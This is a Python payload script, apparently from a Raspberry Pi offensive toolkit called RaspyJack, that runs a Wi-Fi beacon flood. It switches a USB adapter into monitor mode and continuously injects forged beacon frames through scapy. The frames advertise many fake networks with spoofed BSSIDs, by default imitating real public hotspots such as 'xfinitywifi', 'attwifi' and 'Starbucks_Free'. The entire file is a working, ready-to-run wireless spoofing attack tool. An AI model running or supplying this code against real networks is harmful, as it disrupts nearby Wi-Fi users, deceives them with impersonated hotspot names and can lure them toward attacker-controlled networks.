#!/usr/bin/env python3
"""
RaspyJack Payload -- SSID Pool (Beacon Flood)
==============================================
Author: 7h30th3r0n3

Broadcast multiple SSIDs simultaneously using scapy beacon injection.
Each SSID gets a random but persistent BSSID.  Built-in list plus
custom entries from config.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode + packet injection
- pip install scapy

Controls
--------
  OK         -- Start / stop broadcast
  UP / DOWN  -- Scroll SSID list
  KEY1       -- Add custom SSID (character scroll)
  KEY2       -- Remove selected SSID
  KEY3       -- Exit
"""

import os
import sys
import time
import json
import random
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ── Pin / LCD setup ──────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ── Constants ────────────────────────────────────────────────────────────────
CONFIG_FILE = "/root/Raspyjack/config/ssid_pool/ssids.json"
DEFAULT_SSIDS = [
    "Free WiFi", "Hotel_Guest", "Airport_WiFi", "Corporate_Net",
    "Starbucks_Free", "xfinitywifi", "Google_Starbucks",
    "attwifi", "NETGEAR_Guest",
]
ROWS_VISIBLE = 7
ROW_H = 12
CHARSET = " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-."

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
ssid_list = []         # [{"ssid": ..., "bssid": ...}]
broadcasting = False
mon_iface = None
scroll_pos = 0
selected_idx = 0
beacons_sent = 0
probes_seen = 0
status_msg = "Idle"
_running = True

# Add-SSID mode state
adding_ssid = False
add_buffer = ""
add_char_idx = 0


# ── Onboard WiFi detection ──────────────────────────────────────────────────

def _is_onboard_wifi_iface(iface):
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_external_wifi():
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if _is_onboard_wifi_iface(name):
                continue
            return name
    except Exception:
        pass
    return None


# ── Monitor mode helpers ────────────────────────────────────────────────────

def _enable_monitor(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)
    return iface


def _disable_monitor(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", iface, "set", "type", "managed"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)
    except Exception:
        pass


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ── Random BSSID ─────────────────────────────────────────────────────────────

def _random_bssid():
    """Generate a locally-administered random MAC."""
    octets = [random.randint(0x00, 0xFF) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE  # locally administered, unicast
    return ":".join(f"{b:02X}" for b in octets)


# ── Config helpers ───────────────────────────────────────────────────────────

def _load_config():
    global ssid_list
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as fh:
                data = json.load(fh)
            with lock:
                ssid_list = list(data.get("ssids", []))
            return
        except Exception:
            pass
    # Initialise from defaults
    with lock:
        ssid_list = [{"ssid": s, "bssid": _random_bssid()} for s in DEFAULT_SSIDS]
    _save_config()


def _save_config():
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with lock:
        data = {"ssids": list(ssid_list)}
    with open(CONFIG_FILE, "w") as fh:
        json.dump(data, fh, indent=2)


# ── Beacon builder ───────────────────────────────────────────────────────────

def _build_beacon(ssid, bssid):
    """Return a scapy beacon frame for the given SSID/BSSID."""
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid.encode("utf-8"), len=len(ssid))
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    ds = Dot11Elt(ID="DSset", info=b"\x06")  # channel 6
    rsn = Dot11Elt(
        ID=48,
        info=(b"\x01\x00"             # RSN version
              b"\x00\x0f\xac\x04"     # CCMP
              b"\x01\x00"
              b"\x00\x0f\xac\x04"     # CCMP
              b"\x01\x00"
              b"\x00\x0f\xac\x02"),   # PSK
    )
    return RadioTap() / dot11 / beacon / essid / rates / ds / rsn


# ── Broadcast thread ────────────────────────────────────────────────────────

def _broadcast_loop():
    global beacons_sent
    while True:
        with lock:
            if not broadcasting:
                break
            entries = list(ssid_list)
            iface = mon_iface

        if not entries or not iface:
            time.sleep(0.1)
            continue

        for entry in entries:
            with lock:
                if not broadcasting:
                    return
            pkt = _build_beacon(entry["ssid"], entry["bssid"])
            try:
                sendp(pkt, iface=iface, count=1, inter=0, verbose=False)
                with lock:
                    beacons_sent += 1
            except Exception:
                pass
        time.sleep(0.02)


# ── Start / stop ─────────────────────────────────────────────────────────────

def _start_broadcast():
    global broadcasting, mon_iface, status_msg
    ext = _find_external_wifi()
    if not ext:
        with lock:
            status_msg = "No USB WiFi"
        return
    if not SCAPY_OK:
        with lock:
            status_msg = "scapy missing"
        return
    iface = _enable_monitor(ext)
    _set_channel(iface, 6)
    with lock:
        mon_iface = iface
        broadcasting = True
        status_msg = f"TX on {iface}"
    threading.Thread(target=_broadcast_loop, daemon=True).start()


def _stop_broadcast():
    global broadcasting, status_msg
    with lock:
        broadcasting = False
        iface = mon_iface
        status_msg = "Stopped"
    time.sleep(0.3)
    if iface:
        _disable_monitor(iface)


# ── Add / remove SSIDs ──────────────────────────────────────────────────────

def _add_ssid(name):
    if not name.strip():
        return
    entry = {"ssid": name.strip(), "bssid": _random_bssid()}
    with lock:
        ssid_list.append(entry)
    _save_config()


def _remove_selected():
    with lock:
        if 0 <= selected_idx < len(ssid_list):
            new_list = ssid_list[:selected_idx] + ssid_list[selected_idx + 1:]
            ssid_list.clear()
            ssid_list.extend(new_list)
    _save_config()


# ── Drawing ──────────────────────────────────────────────────────────────────

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        active = broadcasting
        msg = status_msg
        entries = list(ssid_list)
        sp = scroll_pos
        sel = selected_idx
        sent = beacons_sent
        in_add = adding_ssid
        buf = add_buffer
        ci = add_char_idx

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "SSID POOL", font=font, fill="#FF9800")
    color = "#00FF00" if active else "#FF0000"
    d.ellipse((118, 3, 126, 11), fill=color)

    y = 15
    d.text((2, y), f"{msg[:14]} Tx:{sent}", font=font, fill="#888")
    y += 13

    if in_add:
        # Add-SSID input mode
        d.text((2, y), "Add SSID:", font=font, fill="#FFAA00")
        y += 12
        d.text((2, y), buf + "_", font=font, fill="#FFFFFF")
        y += 14
        d.text((2, y), f"Char: {CHARSET[ci]}", font=font, fill="#00FF00")
        y += 12
        d.text((2, y), "UP/DN=char OK=add", font=font, fill="#666")
        y += 12
        d.text((2, y), "RIGHT=confirm", font=font, fill="#666")
        y += 12
        d.text((2, y), "LEFT=backspace", font=font, fill="#666")
    else:
        # SSID list
        end = min(sp + ROWS_VISIBLE, len(entries))
        for i in range(sp, end):
            e = entries[i]
            prefix = ">" if i == sel else " "
            name = e["ssid"][:18]
            clr = "#FFAA00" if i == sel else "#CCCCCC"
            d.text((2, y), f"{prefix}{name}", font=font, fill=clr)
            y += ROW_H
        if not entries:
            d.text((2, y), "No SSIDs", font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if in_add:
        d.text((2, 117), "K3=Cancel", font=font, fill="#AAA")
    else:
        lbl = "OK:Stop" if active else "OK:Go"
        d.text((2, 117), f"{lbl} K1:+ K2:- K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global scroll_pos, selected_idx, status_msg
    global adding_ssid, add_buffer, add_char_idx

    _load_config()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "SSID POOL", font=font, fill="#FF9800")
    d.text((4, 28), "Beacon flood with", font=font, fill="#888")
    d.text((4, 40), "multiple fake SSIDs.", font=font, fill="#888")
    d.text((4, 60), "OK=Start  K1=Add", font=font, fill="#666")
    d.text((4, 72), "K2=Remove K3=Exit", font=font, fill="#666")
    with lock:
        cnt = len(ssid_list)
    d.text((4, 90), f"SSIDs loaded: {cnt}", font=font, fill="#FF9800")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if adding_ssid:
                # Character input mode
                if btn == "KEY3":
                    adding_ssid = False
                    add_buffer = ""
                    time.sleep(0.25)
                elif btn == "UP":
                    add_char_idx = (add_char_idx + 1) % len(CHARSET)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    add_char_idx = (add_char_idx - 1) % len(CHARSET)
                    time.sleep(0.15)
                elif btn == "OK":
                    add_buffer = add_buffer + CHARSET[add_char_idx]
                    time.sleep(0.2)
                elif btn == "LEFT":
                    if add_buffer:
                        add_buffer = add_buffer[:-1]
                    time.sleep(0.2)
                elif btn == "RIGHT":
                    if add_buffer.strip():
                        _add_ssid(add_buffer)
                        with lock:
                            status_msg = f"Added: {add_buffer[:10]}"
                    adding_ssid = False
                    add_buffer = ""
                    time.sleep(0.25)
            else:
                if btn == "KEY3":
                    break

                if btn == "OK":
                    with lock:
                        active = broadcasting
                    if active:
                        _stop_broadcast()
                    else:
                        _start_broadcast()
                    time.sleep(0.3)

                elif btn == "UP":
                    with lock:
                        selected_idx = max(0, selected_idx - 1)
                        if selected_idx < scroll_pos:
                            scroll_pos = selected_idx
                    time.sleep(0.2)

                elif btn == "DOWN":
                    with lock:
                        selected_idx = min(len(ssid_list) - 1, selected_idx + 1)
                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                    time.sleep(0.2)

                elif btn == "KEY1":
                    adding_ssid = True
                    add_buffer = ""
                    add_char_idx = 0
                    time.sleep(0.25)

                elif btn == "KEY2":
                    _remove_selected()
                    with lock:
                        if selected_idx >= len(ssid_list):
                            selected_idx = max(0, len(ssid_list) - 1)
                        status_msg = "Removed"
                    time.sleep(0.3)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_broadcast()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
